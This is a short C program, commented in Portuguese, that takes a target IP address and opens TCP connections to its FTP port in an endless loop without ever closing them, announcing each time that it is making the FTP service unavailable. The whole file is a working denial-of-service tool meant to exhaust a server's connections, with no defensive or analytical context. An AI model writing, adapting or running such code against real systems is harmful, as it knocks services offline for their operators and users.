#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  int meuSocket; //variável que representa o socket na máquina cliente e que recebe um inteiro que representa a porta
  int conecta; //recebe 0 se a conexão com o servidor foi feita com sucesso
  int porta = 21; //porta FTP do servidor alvo
  char *destino; //variável que recebe o endereço IP passado pelo usuário
  if(argc < 2){ //verifica se o argumento, endereço IP do servidor FTP, foi passado pelo usuário
    printf("Exemplo de uso: %s \"IP_ALVO\" \n", argv[0]); 
    exit(1);
  }
  destino = argv[1]; //passa o IP passado pelo usuário para a variável destino
  struct sockaddr_in alvo; //estrutura do socket, que recebe os dados do servidor a ser conectado e o tipo de socket
  while (1){ //até rolar o CTRL+C
    //cria o socket
    meuSocket = socket(AF_INET, SOCK_STREAM, 0);
    alvo.sin_family = AF_INET;
    alvo.sin_addr.s_addr = inet_addr(destino); //passa o endereço IP do servidor
    alvo.sin_port = htons(porta); //passa a porta do servidor
    //conecta com o servidor
    conecta = connect(meuSocket, (struct sockaddr *)&alvo, sizeof alvo);
    if(conecta == 0){ //verifica se conectou ao servidor
      printf("Tornando o serviço FTP indisponível... %d \n", meuSocket);
    }
  }
  return 1;
}
